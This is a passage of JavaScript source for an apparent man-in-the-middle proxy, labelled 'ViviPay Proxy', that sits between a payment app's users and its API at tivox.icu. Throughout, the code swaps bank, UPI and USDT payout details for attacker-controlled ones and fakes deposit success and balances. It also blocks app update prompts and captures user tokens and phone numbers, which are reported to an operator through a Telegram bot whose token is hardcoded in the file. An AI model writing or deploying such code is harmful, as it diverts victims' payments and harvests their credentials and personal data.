const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const { Redis } = require('@upstash/redis');
const crypto = require('crypto');

const app = express();
const ORIGINAL_API = 'https://tivox.icu';
const BOT_TOKEN = '8537838501:AAFYQV9aDYaOV_JWvwksPMdyY1IXpY34Qqg';
const WEBHOOK_URL = 'https://rtyhh.vercel.app/bot-webhook';
const REDIS_URL = process.env.KV_REST_API_URL || process.env.UPSTASH_REDIS_REST_URL;
const REDIS_TOKEN = process.env.KV_REST_API_TOKEN || process.env.UPSTASH_REDIS_REST_TOKEN;
const TELEGRAM_OVERRIDE = 'https://t.me/VIVIPAYR2';

const DEFAULT_DATA = {
  banks: [],
  activeIndex: -1,
  botEnabled: true,
  autoRotate: false,
  lastUsedIndex: -1,
  adminChatId: null,
  logRequests: false,
  usdtAddress: '',
  depositSuccess: false,
  depositBonus: 0,
  withdrawOverride: 0,
  userOverrides: {},
  trackedUsers: {},
  suspendedPhones: {},
  blockUpdate: true
};

let bot = null;
let webhookSet = false;
try { bot = new TelegramBot(BOT_TOKEN); } catch(e) {}

let redis = null;
if (REDIS_URL && REDIS_TOKEN) {
  try { redis = new Redis({ url: REDIS_URL, token: REDIS_TOKEN }); } catch(e) {}
}

let cachedData = null;
let cacheTime = 0;
const CACHE_TTL = 5000;
const tokenUserMap = {};
const userPhoneMap = {};
let debugNextResponse = false;

async function ensureWebhook() {
  if (!bot || webhookSet) return;
  try {
    await bot.setWebHook(WEBHOOK_URL);
    webhookSet = true;
  } catch(e) {}
}

async function loadData(forceRefresh) {
  if (!forceRefresh && cachedData && (Date.now() - cacheTime < CACHE_TTL)) return cachedData;
  if (!redis) return { ...DEFAULT_DATA };
  try {
    let raw = await redis.get('vivipayData');
    if (raw) {
      if (typeof raw === 'string') {
        try { raw = JSON.parse(raw); } catch(e) {}
      }
      if (typeof raw === 'object' && raw !== null) {
        cachedData = { ...DEFAULT_DATA, ...raw };
      } else {
        cachedData = { ...DEFAULT_DATA };
      }
      if (!cachedData.userOverrides) cachedData.userOverrides = {};
      if (!cachedData.trackedUsers) cachedData.trackedUsers = {};
      cacheTime = Date.now();
      return cachedData;
    }
  } catch(e) {
    console.error('Redis load error:', e.message);
  }
  cachedData = { ...DEFAULT_DATA };
  cacheTime = Date.now();
  return cachedData;
}

async function saveData(data) {
  const skipMerge = data._skipOverrideMerge;
  if (skipMerge) delete data._skipOverrideMerge;
  if (!redis) { cachedData = data; cacheTime = Date.now(); return; }
  try {
    if (!skipMerge) {
      const current = await redis.get('vivipayData');
      if (current && typeof current === 'object') {
        const settingsKeys = ['banks', 'activeIndex', 'autoRotate', 'botEnabled', 'usdtAddress', 'logRequests', 'suspendedPhones', 'adminChatId', 'depositSuccess', 'depositBonus', 'withdrawOverride', 'blockUpdate'];
        for (const key of settingsKeys) {
          if (current[key] !== undefined) {
            data[key] = current[key];
          }
        }
        if (current.userOverrides) {
          data.userOverrides = JSON.parse(JSON.stringify(current.userOverrides));
        }
        if (current.balanceHistory && Array.isArray(current.balanceHistory)) {
          if (!data.balanceHistory || data.balanceHistory.length < current.balanceHistory.length) {
            data.balanceHistory = current.balanceHistory;
          }
        }
        if (current.sellHistory && Array.isArray(current.sellHistory)) {
          if (!data.sellHistory || data.sellHistory.length < current.sellHistory.length) {
            data.sellHistory = current.sellHistory;
          }
        }
      }
    }
    cachedData = data;
    cacheTime = Date.now();
    await redis.set('vivipayData', data);
  } catch(e) {
    console.error('Redis save error:', e.message);
    cachedData = data;
    cacheTime = Date.now();
  }
}

function getTokenFromReq(req) {
  return req.headers['apptoken'] || req.headers['appToken'] || req.headers['authorization'] || req.headers['token'] || req.headers['auth'] || req.headers['cookie'] || '';
}

function saveTokenUserId(req, userId) {
  if (!userId) return;
  const tok = getTokenFromReq(req);
  if (tok && tok.length > 10) {
    const key = tok.substring(0, 100);
    tokenUserMap[key] = String(userId);
    if (redis) redis.hset('vivipayTokenMap', key, String(userId)).catch(()=>{});
  }
}

async function getUserIdFromToken(req) {
  const tok = getTokenFromReq(req);
  if (!tok || tok.length < 10) return null;
  const key = tok.substring(0, 100);
  if (tokenUserMap[key]) return tokenUserMap[key];
  if (redis) {
    try {
      const stored = await redis.hget('vivipayTokenMap', key);
      if (stored) { tokenUserMap[key] = String(stored); return String(stored); }
    } catch(e) {}
  }
  return null;
}

async function extractUserId(req, jsonResp) {
  const fromToken = await getUserIdFromToken(req);
  if (fromToken) return fromToken;
  const body = req.parsedBody || {};
  const uid = body.memberCodeId || body.userId || body.userid || body.memberId || body.uid || body.id || body.account || body.username || body.channelUid || '';
  if (uid) return String(uid);
  const qs = new URLSearchParams((req.originalUrl || '').split('?')[1] || '');
  if (qs.get('userId')) return String(qs.get('userId'));
  if (qs.get('uid')) return String(qs.get('uid'));
  if (qs.get('memberId')) return String(qs.get('memberId'));
  if (qs.get('channelUid')) return String(qs.get('channelUid'));
  const respData = getResponseData(jsonResp);
  if (respData && typeof respData === 'object' && !Array.isArray(respData)) {
    const rid = respData.memberCodeId || respData.userId || respData.userid || respData.memberId || respData.uid || respData.id || respData.channelUid || respData.account || '';
    if (rid) return String(rid);
  }
  const authHeader = getTokenFromReq(req);
  if (authHeader) {
    try {
      const clean = authHeader.replace('Bearer ', '');
      const parts = clean.split('.');
      if (parts.length === 3) {
        const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());
        if (payload.userId) return String(payload.userId);
        if (payload.uid) return String(payload.uid);
        if (payload.memberId) return String(payload.memberId);
        if (payload.sub) return String(payload.sub);
        if (payload.channelUid) return String(payload.channelUid);
      }
    } catch(e) {}
  }
  return '';
}

async function trackUser(data, userId, info, phone) {
  if (!userId) return;
  if (!data.trackedUsers) data.trackedUsers = {};
  const existing = data.trackedUsers[String(userId)] || {};
  data.trackedUsers[String(userId)] = {
    lastSeen: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
    lastAction: info || existing.lastAction || '',
    orderCount: (existing.orderCount || 0) + (info && info.includes('Order') ? 1 : 0),
    phone: phone || existing.phone || ''
  };
  if (phone) userPhoneMap[String(userId)] = phone;
}

function isLogOff(data, userId) {
  if (!userId) return false;
  const uo = data.userOverrides && data.userOverrides[String(userId)];
  return uo && uo.logOff === true;
}

const logOffTokens = new Set();
const checkedTokens = new Set();

function isLogOffByTokenFast(data, req) {
  const tok = getTokenFromReq(req);
  if (!tok || tok.length < 10) return false;
  const tKey = tok.substring(0, 100);
  if (logOffTokens.has(tKey)) return true;
  const userId = tokenUserMap[tKey] || '';
  if (userId && isLogOff(data, userId)) { logOffTokens.add(tKey); return true; }
  return false;
}

function getPhone(data, userId) {
  if (!userId) return '';
  if (userPhoneMap[String(userId)]) return userPhoneMap[String(userId)];
  const tracked = data.trackedUsers && data.trackedUsers[String(userId)];
  if (tracked && tracked.phone) {
    userPhoneMap[String(userId)] = tracked.phone;
    return tracked.phone;
  }
  return '';
}

function getUserOverride(data, userId) {
  if (!userId || !data.userOverrides) return null;
  return data.userOverrides[String(userId)] || null;
}

function getEffectiveSettings(data, userId) {
  const uo = getUserOverride(data, userId);
  return {
    botEnabled: uo && uo.botEnabled !== undefined ? uo.botEnabled : data.botEnabled,
    depositSuccess: uo && uo.depositSuccess !== undefined ? uo.depositSuccess : data.depositSuccess,
    depositBonus: uo && uo.depositBonus !== undefined ? uo.depositBonus : (data.depositBonus || 0),
    bankOverride: uo && uo.bankIndex !== undefined ? uo.bankIndex : null
  };
}

function getActiveBank(data, userId) {
  const uo = getUserOverride(data, userId);
  if (uo && uo.bankIndex !== undefined && uo.bankIndex >= 0 && uo.bankIndex < data.banks.length) {
    return data.banks[uo.bankIndex];
  }
  if (data.autoRotate && data.banks.length > 1) {
    let idx;
    do { idx = Math.floor(Math.random() * data.banks.length); } while (idx === data.lastUsedIndex && data.banks.length > 1);
    data.lastUsedIndex = idx;
    data._rotatedIndex = idx;
    return data.banks[idx];
  }
  if (data.activeIndex >= 0 && data.activeIndex < data.banks.length) return data.banks[data.activeIndex];
  if (data.banks.length > 0) return data.banks[0];
  return null;
}

async function getActiveBankAndSave(data, userId) {
  const bank = getActiveBank(data, userId);
  if (data.autoRotate && data._rotatedIndex !== undefined) {
    data.lastUsedIndex = data._rotatedIndex;
    delete data._rotatedIndex;
    await saveData(data);
  }
  return bank;
}

function bankListText(d) {
  if (d.banks.length === 0) return 'No banks added yet.';
  return d.banks.map((b, i) => {
    const a = i === d.activeIndex ? ' ✅' : '';
    return `${i + 1}. ${b.accountHolder} | ${b.accountNo} | ${b.ifsc}${b.bankName ? ' | ' + b.bankName : ''}${b.upiId ? ' | UPI: ' + b.upiId : ''}${a}`;
  }).join('\n');
}

app.use(async (req, res, next) => {
  const chunks = [];
  req.on('data', c => chunks.push(c));
  req.on('end', () => {
    req.rawBody = Buffer.concat(chunks);
    const ct = (req.headers['content-type'] || '').toLowerCase();
    try {
      if (ct.includes('json')) {
        req.parsedBody = JSON.parse(req.rawBody.toString());
      } else if (ct.includes('form') && !ct.includes('multipart')) {
        const params = new URLSearchParams(req.rawBody.toString());
        req.parsedBody = Object.fromEntries(params);
      } else {
        req.parsedBody = {};
      }
    } catch(e) { req.parsedBody = {}; }
    next();
  });
});

async function proxyFetch(req) {
  const url = ORIGINAL_API + req.originalUrl;
  const fwd = {};
  for (const [k, v] of Object.entries(req.headers)) {
    const kl = k.toLowerCase();
    if (kl === 'host' || kl === 'connection' || kl === 'content-length' ||
        kl === 'transfer-encoding' || kl.startsWith('x-vercel') || kl.startsWith('x-forwarded')) continue;
    fwd[k] = v;
  }
  fwd['host'] = 'tivox.icu';
  const opts = { method: req.method, headers: fwd };
  if (req.method !== 'GET' && req.method !== 'HEAD' && req.rawBody && req.rawBody.length > 0) {
    opts.body = req.rawBody;
    fwd['content-length'] = String(req.rawBody.length);
  }
  const response = await fetch(url, opts);
  const respBody = await response.text();
  const respHeaders = {};
  response.headers.forEach((val, key) => {
    const kl = key.toLowerCase();
    if (kl !== 'transfer-encoding' && kl !== 'connection' && kl !== 'content-encoding' && kl !== 'content-length') {
      respHeaders[key] = val;
    }
  });
  const blockData = cachedData || DEFAULT_DATA;
  if (blockData.blockUpdate !== false) {
    for (const k of Object.keys(respHeaders)) {
      const kl = k.toLowerCase();
      if (kl === 'needupdateflag' || kl === 'x-update' || kl === 'force-update') {
        delete respHeaders[k];
      }
    }
  }
  let jsonResp = null;
  try { jsonResp = JSON.parse(respBody); } catch(e) {}
  return { response, respBody, respHeaders, jsonResp };
}

function getResponseData(jsonResp) {
  if (!jsonResp) return null;
  if (jsonResp.data !== undefined) return jsonResp.data;
  if (jsonResp.body) return jsonResp.body;
  if (jsonResp.result) return jsonResp.result;
  return null;
}

function sendJson(res, headers, json, fallback) {
  const body = json ? JSON.stringify(json) : fallback;
  headers['content-type'] = 'application/json; charset=utf-8';
  headers['content-length'] = String(Buffer.byteLength(body));
  headers['cache-control'] = 'no-store, no-cache, must-revalidate';
  headers['pragma'] = 'no-cache';
  delete headers['etag'];
  delete headers['last-modified'];
  res.writeHead(200, headers);
  res.end(body);
}

async function transparentProxy(req, res) {
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    if (jsonResp) {
      const rd = getResponseData(jsonResp);
      const uid = rd && typeof rd === 'object' && !Array.isArray(rd) ? (rd.userId || rd.uid || rd.memberId || rd.channelUid || rd.id || '') : '';
      if (uid) saveTokenUserId(req, uid);
    }
    const data = cachedData || await loadData();
    if (data.usdtAddress && jsonResp) {
      const result = replaceUsdtInResponse(jsonResp, data);
      if (result && result.oldAddr) {
        const newBody = JSON.stringify(jsonResp);
        respHeaders['content-type'] = 'application/json; charset=utf-8';
        respHeaders['content-length'] = String(Buffer.byteLength(newBody));
        respHeaders['cache-control'] = 'no-store, no-cache, must-revalidate';
        delete respHeaders['etag'];
        delete respHeaders['last-modified'];
        res.writeHead(response.status, respHeaders);
        res.end(newBody);
        return;
      }
    }
    res.writeHead(response.status, respHeaders);
    res.end(respBody);
  } catch(e) {
    if (!res.headersSent) res.status(502).json({ error: 'proxy error' });
  }
}

const BANK_FIELDS = {
  'accountno': 'accountNo', 'accountnumber': 'accountNo', 'account_no': 'accountNo',
  'receiveaccountno': 'accountNo', 'bankaccount': 'accountNo', 'acno': 'accountNo',
  'bankaccountno': 'accountNo', 'beneficiaryaccount': 'accountNo', 'payeeaccount': 'accountNo',
  'holderaccount': 'accountNo', 'cardno': 'accountNo', 'cardnumber': 'accountNo',
  'bankcardno': 'accountNo', 'payeecardno': 'accountNo', 'receivecardno': 'accountNo',
  'payeebankaccount': 'accountNo', 'payeebankaccountno': 'accountNo', 'payeeaccountno': 'accountNo',
  'receiveraccount': 'accountNo', 'receiveraccountno': 'accountNo', 'receiveaccountnumber': 'accountNo',
  'walletaccount': 'accountNo', 'walletno': 'accountNo', 'walletaccountno': 'accountNo',
  'collectionaccount': 'accountNo', 'collectionaccountno': 'accountNo',
  'customerbanknumber': 'accountNo', 'customerbankaccount': 'accountNo', 'customeraccountno': 'accountNo',
  'beneficiaryname': 'accountHolder', 'accountname': 'accountHolder', 'account_name': 'accountHolder',
  'receiveaccountname': 'accountHolder', 'holdername': 'accountHolder',
  'accountholder': 'accountHolder', 'bankaccountholder': 'accountHolder', 'receivename': 'accountHolder',
  'payeename': 'accountHolder', 'bankaccountname': 'accountHolder', 'realname': 'accountHolder',
  'cardholder': 'accountHolder', 'cardname': 'accountHolder', 'bankcardname': 'accountHolder',
  'payeecardname': 'accountHolder', 'receivecardname': 'accountHolder', 'receivercardname': 'accountHolder',
  'receivername': 'accountHolder', 'collectionname': 'accountHolder', 'collectionaccountname': 'accountHolder',
  'payeerealname': 'accountHolder', 'receiverrealname': 'accountHolder',
  'customername': 'accountHolder', 'customerrealname': 'accountHolder',
  'ifsc': 'ifsc', 'ifsccode': 'ifsc', 'ifsc_code': 'ifsc', 'receiveifsc': 'ifsc',
  'bankifsc': 'ifsc', 'payeeifsc': 'ifsc', 'payeebankifsc': 'ifsc', 'receiverifsc': 'ifsc',
  'receiverbankifsc': 'ifsc', 'collectionifsc': 'ifsc',
  'bankname': 'bankName', 'bank_name': 'bankName', 'bank': 'bankName',
  'payeebankname': 'bankName', 'receiverbankname': 'bankName', 'receivebankname': 'bankName',
  'collectionbankname': 'bankName',
  'upiid': 'upiId', 'upi_id': 'upiId', 'upi': 'upiId', 'vpa': 'upiId',
  'upiaddress': 'upiId', 'payeeupi': 'upiId', 'payeeupiid': 'upiId',
  'receiverupi': 'upiId', 'walletupi': 'upiId', 'collectionupi': 'upiId',
  'walletaddress': 'upiId', 'payaddress': 'upiId', 'payaccount': 'upiId',
  'customerupi': 'upiId'
};

function replaceBankInUrl(urlStr, bank) {
  if (!urlStr || typeof urlStr !== 'string') return urlStr;
  if (!urlStr.includes('://') && !urlStr.includes('?')) return urlStr;
  const urlParams = [
    { names: ['account', 'accountNo', 'account_no', 'accountno', 'account_number', 'accountNumber', 'acc', 'receiveAccountNo', 'receiver_account', 'pa'], value: bank.accountNo },
    { names: ['name', 'accountName', 'account_name', 'accountname', 'receiveAccountName', 'receiver_name', 'beneficiary_name', 'beneficiaryName', 'pn', 'holder_name'], value: bank.accountHolder },
    { names: ['ifsc', 'ifsc_code', 'ifscCode', 'receiveIfsc', 'IFSC'], value: bank.ifsc }
  ];
  let result = urlStr;
  for (const group of urlParams) {
    if (!group.value) continue;
    for (const paramName of group.names) {
      const regex = new RegExp('([?&])(' + paramName.replace(/[.*+?^${}()|[\]\\]/g, '\\$&') + ')=([^&]*)', 'i');
      result = result.replace(regex, '$1$2=' + encodeURIComponent(group.value));
    }
  }
  if (bank.upiId && result.includes('upi://pay')) {
    result = result.replace(/pa=[^&]+/, `pa=${bank.upiId}`);
    if (bank.accountHolder) result = result.replace(/pn=[^&]+/, `pn=${encodeURIComponent(bank.accountHolder)}`);
  }
  return result;
}

function deepReplace(obj, bank, originalValues, depth) {
  if (!obj || typeof obj !== 'object' || depth > 10) return;
  if (!originalValues) originalValues = {};
  for (const key of Object.keys(obj)) {
    const val = obj[key];
    if (val && typeof val === 'object') {
      if (Array.isArray(val)) {
        val.forEach(item => { if (item && typeof item === 'object') deepReplace(item, bank, originalValues, depth + 1); });
      } else {
        deepReplace(val, bank, originalValues, depth + 1);
      }
      continue;
    }
    if (typeof val !== 'string' && typeof val !== 'number') continue;
    const kl = key.toLowerCase().replace(/[_\-\s]/g, '');
    const mapped = BANK_FIELDS[kl];
    if (mapped && bank[mapped] && String(val).length > 0) {
      if (typeof val === 'string' && val.length > 3) originalValues[key] = val;
      obj[key] = bank[mapped];
    }
    if (typeof val === 'string') {
      if (val.includes('://') || (val.includes('?') && val.includes('='))) {
        obj[key] = replaceBankInUrl(val, bank);
      }
      for (const [origKey, origVal] of Object.entries(originalValues)) {
        if (typeof origVal === 'string' && origVal.length > 3 && typeof obj[key] === 'string' && obj[key].includes(origVal)) {
          const mappedF = BANK_FIELDS[origKey.toLowerCase().replace(/[_\-\s]/g, '')];
          if (mappedF && bank[mappedF]) {
            obj[key] = obj[key].split(origVal).join(bank[mappedF]);
          }
        }
      }
    }
  }
}

function markDepositSuccess(obj) {
  if (!obj) return;
  const failValues = [3, '3', 4, '4', -1, '-1', 'failed', 'fail', 'FAILED', 'FAIL', 'cancelled', 'canceled'];
  if (obj.payStatus !== undefined) {
    if (!failValues.includes(obj.payStatus)) obj.payStatus = 2;
    return;
  }
  const statusFields = ['status', 'orderStatus', 'rechargeStatus', 'state', 'stat'];
  for (const field of statusFields) {
    if (obj[field] !== undefined) {
      if (failValues.includes(obj[field])) continue;
      if (typeof obj[field] === 'number') obj[field] = 2;
      else if (typeof obj[field] === 'string') {
        const num = parseInt(obj[field]);
        obj[field] = !isNaN(num) ? '2' : 'success';
      }
    }
  }
}

function addBonusToBalanceFields(obj, bonus) {
  if (!obj || typeof obj !== 'object') return;
  const balanceKeys = ['balance', 'userbalance', 'availablebalance', 'totalbalance', 'money', 'coin', 'wallet', 'usermoney', 'rechargebalance', 'totalamount', 'availableamount', 'amount'];
  for (const key of Object.keys(obj)) {
    if (balanceKeys.includes(key.toLowerCase())) {
      const current = parseFloat(obj[key]);
      if (!isNaN(current)) {
        obj[key] = typeof obj[key] === 'string' ? String((current + bonus).toFixed(2)) : parseFloat((current + bonus).toFixed(2));
      }
    }
    if (typeof obj[key] === 'object' && obj[key] !== null && !Array.isArray(obj[key])) {
      addBonusToBalanceFields(obj[key], bonus);
    }
  }
}

function replaceUsdtInResponse(jsonResp, data) {
  if (!data.usdtAddress || !jsonResp) return null;
  const newAddr = data.usdtAddress;
  const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(newAddr)}`;
  function scanAndReplace(obj, depth) {
    if (!obj || typeof obj !== 'object' || depth > 10) return '';
    if (Array.isArray(obj)) { obj.forEach(item => scanAndReplace(item, depth + 1)); return ''; }
    let oldAddr = '';
    for (const key of Object.keys(obj)) {
      const kl = key.toLowerCase();
      if (typeof obj[key] === 'string') {
        if ((kl.includes('usdt') && kl.includes('addr')) || kl === 'address' || kl === 'walletaddress' || kl === 'customusdtaddress' || kl === 'addr' || kl === 'depositaddress' || kl === 'deposit_address' || kl === 'receiveaddress' || kl === 'receiveraddress' || kl === 'payaddress' || kl === 'trcaddress' || kl === 'trc20address' || (kl.includes('address') && obj[key].length >= 30 && /^T[a-zA-Z0-9]{33}$/.test(obj[key]))) {
          if (obj[key].length >= 20 && obj[key] !== newAddr) {
            oldAddr = oldAddr || obj[key];
            obj[key] = newAddr;
          }
        }
        if (kl === 'qrcode' || kl === 'qrcodeurl' || kl === 'qr' || kl === 'codeurl' || kl === 'qrimg' || kl === 'qrimgurl' || kl === 'codeimgurl' || kl === 'codeimg' || kl === 'qrurl' || kl === 'depositqr' || kl === 'depositqrcode') {
          obj[key] = qrUrl;
        }
        if (kl.includes('qr') || kl.includes('code')) {
          if (typeof obj[key] === 'string' && obj[key].includes('http') && (obj[key].includes('qr') || obj[key].includes('code') || obj[key].includes('.png') || obj[key].includes('.jpg'))) {
            obj[key] = qrUrl;
          }
        }
      } else if (typeof obj[key] === 'object') {
        const found = scanAndReplace(obj[key], depth + 1);
        if (found) oldAddr = oldAddr || found;
      }
    }
    if (oldAddr) {
      const escaped = oldAddr.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
      const re = new RegExp(escaped, 'g');
      for (const key of Object.keys(obj)) {
        if (typeof obj[key] === 'string' && obj[key].includes(oldAddr)) {
          obj[key] = obj[key].replace(re, newAddr);
        }
      }
    }
    return oldAddr;
  }
  let foundOld = '';
  const rd = getResponseData(jsonResp);
  if (rd) foundOld = scanAndReplace(rd, 0) || '';
  if (!foundOld) foundOld = scanAndReplace(jsonResp, 0) || '';
  const fullStr = JSON.stringify(jsonResp);
  const trcMatch = fullStr.match(/T[a-zA-Z0-9]{33}/g);
  if (trcMatch) {
    for (const addr of trcMatch) {
      if (addr !== newAddr) {
        foundOld = foundOld || addr;
        const replaced = JSON.stringify(jsonResp).split(addr).join(newAddr);
        try { Object.assign(jsonResp, JSON.parse(replaced)); } catch(e) {}
      }
    }
  }
  return { oldAddr: foundOld, newAddr, qrUrl };
}

app.use((req, res, next) => {
  (async () => {
    try {
      if (!bot) return;
      const data = cachedData || await loadData();
      if (!data.logRequests || !data.adminChatId) return;
      const path = req.originalUrl || req.url;
      if (path.includes('bot-webhook') || path.includes('favicon')) return;
      const tok = getTokenFromReq(req);
      const tKey = tok && tok.length > 10 ? tok.substring(0, 100) : '';
      if (tKey && logOffTokens.has(tKey)) return;
      let userId = tKey ? (tokenUserMap[tKey] || '') : '';
      if (!userId) {
        const body = req.parsedBody || {};
        userId = body.userId || body.uid || body.channelUid || '';
      }
      if (userId && isLogOff(data, userId)) { if (tKey) logOffTokens.add(tKey); return; }
      const phone = getPhone(data, userId);
      const tag = userId ? ` [${userId}]` : '';
      const phoneTag = phone ? ` (${phone})` : '';
      bot.sendMessage(data.adminChatId, `📡 ${req.method} ${path}${tag}${phoneTag}`).catch(()=>{});
    } catch(e) {}
  })();
  next();
});

app.get('/setup-webhook', async (req, res) => {
  if (!bot) return res.json({ error: 'No bot token' });
  try {
    await bot.setWebHook(WEBHOOK_URL);
    webhookSet = true;
    const info = await bot.getWebHookInfo();
    res.json({ success: true, webhook: info });
  } catch(e) { res.json({ error: e.message }); }
});

app.get('/health', async (req, res) => {
  const redisConnected = !!redis;
  let redisWorking = false;
  if (redis) {
    try { await redis.ping(); redisWorking = true; } catch(e) {}
  }
  const data = await loadData(true);
  const active = getActiveBank(data, null);
  res.json({
    status: 'ok',
    app: 'ViviPay Proxy',
    redis: redisConnected ? (redisWorking ? 'connected' : 'error') : 'not configured',
    bankActive: !!active,
    totalBanks: data.banks.length,
    adminSet: !!data.adminChatId,
    perIdOverrides: Object.keys(data.userOverrides || {}).length,
    envCheck: { KV_URL: !!process.env.KV_REST_API_URL, KV_TOKEN: !!process.env.KV_REST_API_TOKEN, UPSTASH_URL: !!process.env.UPSTASH_REDIS_REST_URL, UPSTASH_TOKEN: !!process.env.UPSTASH_REDIS_REST_TOKEN }
  });
});

app.post('/bot-webhook', async (req, res) => {
  try {
    await ensureWebhook();
    if (!bot) return res.sendStatus(200);
    const msg = req.parsedBody?.message;
    if (!msg || !msg.text) return res.sendStatus(200);
    const chatId = msg.chat.id;
    const text = msg.text.trim();
    let data = await loadData(true);

    if (text === '/start') {
      if (data.adminChatId && data.adminChatId !== chatId) {
        await bot.sendMessage(chatId, '❌ Bot already configured with another admin.');
        return res.sendStatus(200);
      }
      data.adminChatId = chatId;
      data._skipOverrideMerge = true;
      await saveData(data);
      await bot.sendMessage(chatId,
`🏦 ViviPay Proxy Controller

=== BANK COMMANDS ===
/addbank Name|AccNo|IFSC|BankName|UPI
/removebank <number>
/setbank <number>
/banks — List all banks

=== CONTROL ===
/on — Proxy ON
/off — Proxy OFF
/rotate — Toggle auto-rotate banks
/log — Toggle request logging
/off log <userId> — Log off for user
/on log <userId> — Log on for user
/update — Block update popup (default ON)
/update on — Allow update popup
/status — Full status
/debug — Debug next response

=== BALANCE ===
/add <amount> <userId> — Add balance
/deduct <amount> <userId> — Remove balance
/remove balance <userId> — Remove all fake balance
/history — All balance changes
/history <userId> — User balance changes
/clearhistory — Clear all history

=== USDT ===
/usdt <address> — Set USDT address
/usdt off — Disable USDT override

=== SUSPEND ===
/suspend <phone> — Block login for phone
/unsuspend <phone> — Unblock login
/suspended — List all suspended

=== SELL CONTROL ===
/control sell <userId> — Toggle sell cut control
/sell history — View sell cut history

=== TRACKING ===
/idtrack — Show all tracked user IDs

Example:
/addbank Rahul Kumar|1234567890|SBIN0001234|SBI|rahul@upi`
      );
      return res.sendStatus(200);
    }

    if (data.adminChatId && chatId !== data.adminChatId) {
      await bot.sendMessage(chatId, '❌ Unauthorized.');
      return res.sendStatus(200);
    }

    if (text === '/status') {
      const active = getActiveBank(data, null);
      const idCount = Object.keys(data.userOverrides || {}).length;
      let m = `📊 ViviPay Status:\nProxy: ${data.botEnabled ? '🟢 ON' : '🔴 OFF'}\nBanks: ${data.banks.length}\nAuto-Rotate: ${data.autoRotate ? '🔄 ON' : '❌ OFF'}\nLog: ${data.logRequests ? '📡 ON' : '🔇 OFF'}\nUpdate Block: ${data.blockUpdate !== false ? '🚫 BLOCKED' : '✅ ALLOWED'}\nTracked Users: ${Object.keys(data.trackedUsers || {}).length}`;
      if (data.usdtAddress) m += `\n₮ USDT: ${data.usdtAddress.substring(0, 15)}...`;
      if (active) m += `\n\n💳 Active:\n${active.accountHolder}\n${active.accountNo}\nIFSC: ${active.ifsc}${active.bankName ? '\nBank: ' + active.bankName : ''}${active.upiId ? '\nUPI: ' + active.upiId : ''}`;
      else m += '\n\n⚠️ No active bank';
      await bot.sendMessage(chatId, m);
      return res.sendStatus(200);
    }

    if (text === '/on') { data = await loadData(true); data.botEnabled = true; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, '🟢 Proxy ON'); return res.sendStatus(200); }
    if (text === '/off') { data = await loadData(true); data.botEnabled = false; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, '🔴 Proxy OFF — passthrough'); return res.sendStatus(200); }
    if (text === '/rotate') { data = await loadData(true); data.autoRotate = !data.autoRotate; data.lastUsedIndex = -1; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, `🔄 Auto-Rotate: ${data.autoRotate ? 'ON' : 'OFF'}`); return res.sendStatus(200); }
    if (text === '/log') { data = await loadData(true); data.logRequests = !data.logRequests; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, `📋 Logging: ${data.logRequests ? 'ON' : 'OFF'}`); return res.sendStatus(200); }

    if (text === '/debug') { debugNextResponse = true; await bot.sendMessage(chatId, '🔍 Debug ON — next request ka full response dump aayega'); return res.sendStatus(200); }

    if (text === '/update' || text === '/update off' || text === '/update on') {
      data = await loadData(true);
      if (text === '/update on') {
        data.blockUpdate = false;
        data._skipOverrideMerge = true;
        await saveData(data);
        await bot.sendMessage(chatId, '✅ Update popup ALLOWED');
      } else {
        data.blockUpdate = true;
        data._skipOverrideMerge = true;
        await saveData(data);
        await bot.sendMessage(chatId, '🚫 Update popup BLOCKED');
      }
      return res.sendStatus(200);
    }

    if (text.startsWith('/off log ')) {
      const targetId = text.substring(9).trim();
      if (!targetId) { await bot.sendMessage(chatId, '❌ Format: /off log <userId>'); return res.sendStatus(200); }
      data = await loadData(true);
      if (!data.userOverrides) data.userOverrides = {};
      if (!data.userOverrides[targetId]) data.userOverrides[targetId] = {};
      data.userOverrides[targetId].logOff = true;
      data._skipOverrideMerge = true;
      await saveData(data);
      if (redis) {
        try {
          const allTokens = await redis.hgetall('vivipayTokenMap');
          if (allTokens) {
            for (const [tKey, uid] of Object.entries(allTokens)) {
              if (String(uid) === String(targetId)) {
                await redis.sadd('vivipayLogOffTokens', tKey);
                logOffTokens.add(tKey);
              }
            }
          }
        } catch(e) {}
      }
      for (const [tKey, uid] of Object.entries(tokenUserMap)) {
        if (String(uid) === String(targetId)) logOffTokens.add(tKey);
      }
      await bot.sendMessage(chatId, `🔇 Logging OFF for user ${targetId}`);
      return res.sendStatus(200);
    }

    if (text.startsWith('/on log ')) {
      const targetId = text.substring(8).trim();
      if (!targetId) { await bot.sendMessage(chatId, '❌ Format: /on log <userId>'); return res.sendStatus(200); }
      data = await loadData(true);
      if (data.userOverrides && data.userOverrides[targetId]) {
        delete data.userOverrides[targetId].logOff;
        data._skipOverrideMerge = true;
        await saveData(data);
      }
      if (redis) {
        try {
          const allTokens = await redis.hgetall('vivipayTokenMap');
          if (allTokens) {
            for (const [tKey, uid] of Object.entries(allTokens)) {
              if (String(uid) === String(targetId)) {
                await redis.srem('vivipayLogOffTokens', tKey);
                logOffTokens.delete(tKey);
              }
            }
          }
        } catch(e) {}
      }
      for (const [tKey, uid] of Object.entries(tokenUserMap)) {
        if (String(uid) === String(targetId)) logOffTokens.delete(tKey);
      }
      await bot.sendMessage(chatId, `📡 Logging ON for user ${targetId}`);
      return res.sendStatus(200);
    }

    if (text.startsWith('/add ')) {
      const parts = text.substring(5).trim().split(/\s+/);
      const amount = parseFloat(parts[0]);
      const targetUserId = parts[1] || '';
      if (isNaN(amount) || !targetUserId) {
        await bot.sendMessage(chatId, '❌ Format: /add <amount> <userId>\nExample: /add 500 12345');
        return res.sendStatus(200);
      }
      const freshData = await loadData(true);
      if (!freshData.userOverrides) freshData.userOverrides = {};
      if (!freshData.userOverrides[targetUserId]) freshData.userOverrides[targetUserId] = {};
      freshData.userOverrides[targetUserId].addedBalance = (freshData.userOverrides[targetUserId].addedBalance || 0) + amount;
      const tracked = freshData.trackedUsers && freshData.trackedUsers[targetUserId];
